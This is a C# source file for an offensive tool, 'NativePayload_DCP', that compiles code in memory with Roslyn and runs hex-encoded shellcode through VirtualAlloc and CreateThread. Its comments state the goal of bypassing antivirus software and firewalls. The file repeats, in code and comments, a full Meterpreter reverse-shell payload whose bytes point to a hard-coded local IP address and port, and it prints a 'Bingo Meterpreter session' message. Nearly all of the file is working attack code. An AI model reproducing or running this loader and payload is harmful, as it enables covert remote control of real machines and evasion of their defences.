using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.Emit;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Runtime.ExceptionServices;

namespace NativePayload_DCP
{
    class Program
    {
        
       
        public static void Dynamic_Process(bool has_NativeCode_by_args , string Import_NativeCode_by_args)
        {
            if (has_NativeCode_by_args)
            {
                SyntaxTree syntaxTree = CSharpSyntaxTree.ParseText(" using System.Runtime.ExceptionServices;     using System.Collections.Generic; " +
                               "using System.Linq;" + "using System.Runtime.InteropServices;" + "using System.Text;" + "       using System;                namespace Execute_Me_in_Memory                {                    public class Program                    {         [HandleProcessCorruptedStateExceptions()]                public void Main(string message)" +
                           "{    Console.WriteLine(message);  " +
                        ///"string X =" + "\"fc,48,83,e4,f0,e8,cc,00,00,00,41,51,41,50,52,51,56,48,31,d2,65,48,8b,52,60,48,8b,52,18,48,8b,52,20,48,8b,72,50,48,0f,b7,4a,4a,4d,31,c9,48,31,c0,ac,3c,61,7c,02,2c,20,41,c1,c9,0d,41,01,c1,e2,ed,52,41,51,48,8b,52,20,8b,42,3c,48,01,d0,66,81,78,18,0b,02,0f,85,72,00,00,00,8b,80,88,00,00,00,48,85,c0,74,67,48,01,d0,50,8b,48,18,44,8b,40,20,49,01,d0,e3,56,48,ff,c9,41,8b,34,88,48,01,d6,4d,31,c9,48,31,c0,ac,41,c1,c9,0d,41,01,c1,38,e0,75,f1,4c,03,4c,24,08,45,39,d1,75,d8,58,44,8b,40,24,49,01,d0,66,41,8b,0c,48,44,8b,40,1c,49,01,d0,41,8b,04,88,48,01,d0,41,58,41,58,5e,59,5a,41,58,41,59,41,5a,48,83,ec,20,41,52,ff,e0,58,41,59,5a,48,8b,12,e9,4b,ff,ff,ff,5d,49,be,77,73,32,5f,33,32,00,00,41,56,49,89,e6,48,81,ec,a0,01,00,00,49,89,e5,49,bc,02,00,11,5c,c0,a8,38,01,41,54,49,89,e4,4c,89,f1,41,ba,4c,77,26,07,ff,d5,4c,89,ea,68,01,01,00,00,59,41,ba,29,80,6b,00,ff,d5,6a,05,41,5e,50,50,4d,31,c9,4d,31,c0,48,ff,c0,48,89,c2,48,ff,c0,48,89,c1,41,ba,ea,0f,df,e0,ff,d5,48,89,c7,6a,10,41,58,4c,89,e2,48,89,f9,41,ba,99,a5,74,61,ff,d5,85,c0,74,0a,49,ff,ce,75,e5,e8,93,00,00,00,48,83,ec,10,48,89,e2,4d,31,c9,6a,04,41,58,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7e,55,48,83,c4,20,5e,89,f6,6a,40,41,59,68,00,10,00,00,41,58,48,89,f2,48,31,c9,41,ba,58,a4,53,e5,ff,d5,48,89,c3,49,89,c7,4d,31,c9,49,89,f0,48,89,da,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7d,28,58,41,57,59,68,00,40,00,00,41,58,6a,00,5a,41,ba,0b,2f,0f,30,ff,d5,57,59,41,ba,75,6e,4d,61,ff,d5,49,ff,ce,e9,3c,ff,ff,ff,48,01,c3,48,29,c6,48,85,f6,75,b4,41,ff,e7,58,6a,00,59,49,c7,c2,f0,b5,a2,56,ff,d5\";"    
                        "string X =message;"
                                     + "string[] XX = X.Split(',');" + "byte[] result_de_obf_payload = new byte[XX.Length];" + "for (int i = 0; i<XX.Length; i++)" + "{" + "  result_de_obf_payload[i] = Convert.ToByte(XX[i], 16);" + "}" + "try	{	        	UInt32 MEM_COMMIT = 0x1000;" + "UInt32 PAGE_EXECUTE_READWRITE = 0x40;" + "Console.WriteLine();" + "Console.ForegroundColor = ConsoleColor.Gray;" + "Console.WriteLine(\"Bingo Meterpreter session by Dynamic / Integration Codes ;)\");" + "UInt32 funcAddr = VirtualAlloc(0x00000000, (UInt32)result_de_obf_payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" + "Marshal.Copy(result_de_obf_payload, 0x00000000, (IntPtr)(funcAddr), result_de_obf_payload.Length);" + "IntPtr hThread = IntPtr.Zero;" + "UInt32 threadId = 0;" + "IntPtr pinfo = IntPtr.Zero;" + "hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);" + "WaitForSingleObject(hThread, 0xffffffff); }	catch (Exception e)	{	Console.WriteLine(\"ops error :\"+e.Message);	} " + "Console.ForegroundColor = ConsoleColor.Gray;" +
                            "   Console.WriteLine(message);" +
                           "}" +
                               "[DllImport(\"kernel32\")]" +
                               "private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);" +
                       "[DllImport(\"kernel32\")]" +
                               "private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);" +
                       "[DllImport(\"kernel32\")]" +
                               "private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);" +
                       "}" +
                   "}");



                string assemblyName = Path.GetRandomFileName();
                MetadataReference[] references = new MetadataReference[]
                {
                MetadataReference.CreateFromFile(typeof(object).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(Enumerable).Assembly.Location)

                };
                
                CSharpCompilation compilation = CSharpCompilation.Create(
                    assemblyName,
                    syntaxTrees: new[] { syntaxTree },
                    references: references,
                    options: new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary));

                using (var ms = new MemoryStream())
                {
                    EmitResult result = compilation.Emit(ms);

                    if (!result.Success)
                    {
                        IEnumerable<Diagnostic> failures = result.Diagnostics.Where(diagnostic =>
                            diagnostic.IsWarningAsError ||
                            diagnostic.Severity == DiagnosticSeverity.Error);

                        foreach (Diagnostic diagnostic in failures)
                        {
                            Console.Error.WriteLine("{0}: {1}", diagnostic.Id, diagnostic.GetMessage());
                        }
                    }
                    else
                    {
                        ms.Seek(0, SeekOrigin.Begin);
                        Assembly assembly = Assembly.Load(ms.ToArray());

                        Type type = assembly.GetType("NativePayload_Tinjection.Program");
                        object obj = Activator.CreateInstance(type);
                        // message = Import_NativeCode_by_args
                        type.InvokeMember("Main",BindingFlags.Default | BindingFlags.InvokeMethod,null,obj,new object[] { Import_NativeCode_by_args });
                        
                        //fc,48,83,e4,f0,e8,cc,00,00,00,41,51,41,50,52,51,56,48,31,d2,65,48,8b,52,60,48,8b,52,18,48,8b,52,20,48,8b,72,50,48,0f,b7,4a,4a,4d,31,c9,48,31,c0,ac,3c,61,7c,02,2c,20,41,c1,c9,0d,41,01,c1,e2,ed,52,41,51,48,8b,52,20,8b,42,3c,48,01,d0,66,81,78,18,0b,02,0f,85,72,00,00,00,8b,80,88,00,00,00,48,85,c0,74,67,48,01,d0,50,8b,48,18,44,8b,40,20,49,01,d0,e3,56,48,ff,c9,41,8b,34,88,48,01,d6,4d,31,c9,48,31,c0,ac,41,c1,c9,0d,41,01,c1,38,e0,75,f1,4c,03,4c,24,08,45,39,d1,75,d8,58,44,8b,40,24,49,01,d0,66,41,8b,0c,48,44,8b,40,1c,49,01,d0,41,8b,04,88,48,01,d0,41,58,41,58,5e,59,5a,41,58,41,59,41,5a,48,83,ec,20,41,52,ff,e0,58,41,59,5a,48,8b,12,e9,4b,ff,ff,ff,5d,49,be,77,73,32,5f,33,32,00,00,41,56,49,89,e6,48,81,ec,a0,01,00,00,49,89,e5,49,bc,02,00,11,5c,c0,a8,38,01,41,54,49,89,e4,4c,89,f1,41,ba,4c,77,26,07,ff,d5,4c,89,ea,68,01,01,00,00,59,41,ba,29,80,6b,00,ff,d5,6a,05,41,5e,50,50,4d,31,c9,4d,31,c0,48,ff,c0,48,89,c2,48,ff,c0,48,89,c1,41,ba,ea,0f,df,e0,ff,d5,48,89,c7,6a,10,41,58,4c,89,e2,48,89,f9,41,ba,99,a5,74,61,ff,d5,85,c0,74,0a,49,ff,ce,75,e5,e8,93,00,00,00,48,83,ec,10,48,89,e2,4d,31,c9,6a,04,41,58,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7e,55,48,83,c4,20,5e,89,f6,6a,40,41,59,68,00,10,00,00,41,58,48,89,f2,48,31,c9,41,ba,58,a4,53,e5,ff,d5,48,89,c3,49,89,c7,4d,31,c9,49,89,f0,48,89,da,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7d,28,58,41,57,59,68,00,40,00,00,41,58,6a,00,5a,41,ba,0b,2f,0f,30,ff,d5,57,59,41,ba,75,6e,4d,61,ff,d5,49,ff,ce,e9,3c,ff,ff,ff,48,01,c3,48,29,c6,48,85,f6,75,b4,41,ff,e7,58,6a,00,59,49,c7,c2,f0,b5,a2,56,ff,d5
                    }
                }
            }
        }
      
        public static void Dynamic_Process(string Input_Process_Csharp_Source_Code,int pid,bool has_NativeCode_by_args,string Import_NativeCode_by_args)
        {
            SyntaxTree syntaxTree = CSharpSyntaxTree.ParseText(Input_Process_Csharp_Source_Code).WithFilePath(Input_Process_Csharp_Source_Code);
            //Microsoft.CodeAnalysis.Text.SourceText.From()
                       

            string assemblyName = Path.GetRandomFileName();
            MetadataReference[] references = new MetadataReference[]
            {
                MetadataReference.CreateFromFile(typeof(object).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(Enumerable).Assembly.Location)
            };

            CSharpCompilation compilation = CSharpCompilation.Create(
                assemblyName,
                syntaxTrees: new[] { syntaxTree },
                references: references,
                options: new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary));

            using (var ms = new MemoryStream())
            {
                EmitResult result = compilation.Emit(ms);

                if (!result.Success)
                {
                    IEnumerable<Diagnostic> failures = result.Diagnostics.Where(diagnostic =>
                        diagnostic.IsWarningAsError ||
                        diagnostic.Severity == DiagnosticSeverity.Error);

                    foreach (Diagnostic diagnostic in failures)
                    {
                        Console.Error.WriteLine("{0}: {1}", diagnostic.Id, diagnostic.GetMessage());
                    }
                }
                else
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    Assembly assembly = Assembly.Load(ms.ToArray());

                    Type type = assembly.GetType("NativePayload_Tinjection.Program");
                    object obj = Activator.CreateInstance(type);
                    if (has_NativeCode_by_args)
                    {
                        type.InvokeMember("Main", BindingFlags.Default | BindingFlags.InvokeMethod, null, obj, new object[] { Import_NativeCode_by_args });
                    }
                    else
                    {
                        type.InvokeMember("Main", BindingFlags.Default | BindingFlags.InvokeMethod, null, obj, new object[] { pid.ToString() });
                    }
                    //fc,48,83,e4,f0,e8,cc,00,00,00,41,51,41,50,52,51,56,48,31,d2,65,48,8b,52,60,48,8b,52,18,48,8b,52,20,48,8b,72,50,48,0f,b7,4a,4a,4d,31,c9,48,31,c0,ac,3c,61,7c,02,2c,20,41,c1,c9,0d,41,01,c1,e2,ed,52,41,51,48,8b,52,20,8b,42,3c,48,01,d0,66,81,78,18,0b,02,0f,85,72,00,00,00,8b,80,88,00,00,00,48,85,c0,74,67,48,01,d0,50,8b,48,18,44,8b,40,20,49,01,d0,e3,56,48,ff,c9,41,8b,34,88,48,01,d6,4d,31,c9,48,31,c0,ac,41,c1,c9,0d,41,01,c1,38,e0,75,f1,4c,03,4c,24,08,45,39,d1,75,d8,58,44,8b,40,24,49,01,d0,66,41,8b,0c,48,44,8b,40,1c,49,01,d0,41,8b,04,88,48,01,d0,41,58,41,58,5e,59,5a,41,58,41,59,41,5a,48,83,ec,20,41,52,ff,e0,58,41,59,5a,48,8b,12,e9,4b,ff,ff,ff,5d,49,be,77,73,32,5f,33,32,00,00,41,56,49,89,e6,48,81,ec,a0,01,00,00,49,89,e5,49,bc,02,00,11,5c,c0,a8,38,01,41,54,49,89,e4,4c,89,f1,41,ba,4c,77,26,07,ff,d5,4c,89,ea,68,01,01,00,00,59,41,ba,29,80,6b,00,ff,d5,6a,05,41,5e,50,50,4d,31,c9,4d,31,c0,48,ff,c0,48,89,c2,48,ff,c0,48,89,c1,41,ba,ea,0f,df,e0,ff,d5,48,89,c7,6a,10,41,58,4c,89,e2,48,89,f9,41,ba,99,a5,74,61,ff,d5,85,c0,74,0a,49,ff,ce,75,e5,e8,93,00,00,00,48,83,ec,10,48,89,e2,4d,31,c9,6a,04,41,58,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7e,55,48,83,c4,20,5e,89,f6,6a,40,41,59,68,00,10,00,00,41,58,48,89,f2,48,31,c9,41,ba,58,a4,53,e5,ff,d5,48,89,c3,49,89,c7,4d,31,c9,49,89,f0,48,89,da,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7d,28,58,41,57,59,68,00,40,00,00,41,58,6a,00,5a,41,ba,0b,2f,0f,30,ff,d5,57,59,41,ba,75,6e,4d,61,ff,d5,49,ff,ce,e9,3c,ff,ff,ff,48,01,c3,48,29,c6,48,85,f6,75,b4,41,ff,e7,58,6a,00,59,49,c7,c2,f0,b5,a2,56,ff,d5
                }
            }
        }
        [HandleProcessCorruptedStateExceptions]
        static void Main(string[] args)
        {
            //string input_SourceCode2 = File.ReadAllText("payload_code.txt");
            //Console.WriteLine(input_SourceCode2);
            //foreach (char item in input_SourceCode2)
            //{
            //    Console.Write(item);
            //}
            /// NativePayload Dynamic Code tool
            /// Published by Damon MOhammadbagher Jun 2017
            /// transferring Codes Dynamic Between to Application and Executing Payloads in Memory
            /// [Server] ---> Dynamic C# Codes and Payloads ---> [Client]
            /// [Code A]                                         [Code B]
            /// [Pay+OBF]                                        [CoreCode for Executing Payload + Deobfuscation]
            /// primary Goal Bypassing AVS and Firewalls also Hiding Code and Activity in Memory only

            if (args[0].ToUpper() == "DYN-PAY-ARG") { Dynamic_Process(true, args[1]); }
            /// bug here for strings in file text format.
            if (args[0].ToUpper() == "DYN-TEXT-FILE")
            {
                if (args[1].ToUpper() == "CHUNK")
                {
                    /// importing Dynamic  Codes by two Argumments
                    /// STEP1 CSHARP SOURCE CODE
                    /// STEP2 NativePayload Meterpreter Payload for Executing by STEP1 Code
                    string input_SourceCode = File.ReadAllText(args[2]);
                    Console.WriteLine(input_SourceCode);
                    string Chunk_NativePayload_Meterperter_shell = File.ReadAllText(args[3]);
                    Dynamic_Process(input_SourceCode, Convert.ToInt32(args[3]), true, Chunk_NativePayload_Meterperter_shell);
                }
                else if (args[1].ToUpper() != "CHUNK")
                {
                    /// importing Dynamic  Codes by one Argumments
                    /// STEP1 CSHARP SOURCE CODE
                    /// NativePayload Meterpreter code Hardcoded to STEP1
                    string input_SourceCode = File.ReadAllText(args[1]);
                    Console.WriteLine(input_SourceCode);
                    foreach (char item in input_SourceCode)
                    {
                        Console.Write(item);
                    }
                    Dynamic_Process(input_SourceCode, Convert.ToInt32(args[2]), false, null);
                }
            }
            if (args[0].ToUpper() == "DYN-TEXT") { }
            if (args[0].ToUpper() == "DYN-RAWTEXT-WEB") { }
            if (args[0].ToUpper() == "DYN-HEX-BMP") { }
           

            Console.ReadLine();
          


        }

    }
}
